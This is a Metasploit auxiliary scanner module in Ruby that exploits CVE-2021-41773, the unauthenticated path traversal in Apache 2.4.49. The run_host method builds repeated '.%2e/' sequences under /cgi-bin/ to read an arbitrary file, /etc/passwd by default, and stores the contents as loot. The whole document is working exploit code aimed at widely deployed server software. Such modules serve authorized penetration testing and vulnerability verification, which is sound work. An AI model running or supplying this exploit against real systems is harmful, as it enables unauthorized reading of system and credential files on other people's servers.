##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Path Traversal in Apache 2.4.49',
        'Description' => %q{
          This module exploits an unauthenticated directory traversal vulnerability which exists in Apache version 2.4.49.
          If files outside of the document root are not protected by ‘require all denied’ these requests can succeed.
        },
        'Author' => [
          'Ash Daulton', # Vulnerability discovery
          'Dhiraj Mishra', # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2021-41773']
        ],
        'DisclosureDate' => '2021-10-05',
        'Platform' => 'ruby',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 5 ])
      ]
    )
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = '.%2e/' * datastore['DEPTH'] << filename

    res = send_request_raw({
      'method' => 'GET',
      'uri' => "/cgi-bin/#{traversal}"
    })

    unless res && res.code == 200
      print_error('Nothing was downloaded')
      return
    end

    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      'apache.41773.traversal',
      'text/plain',
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
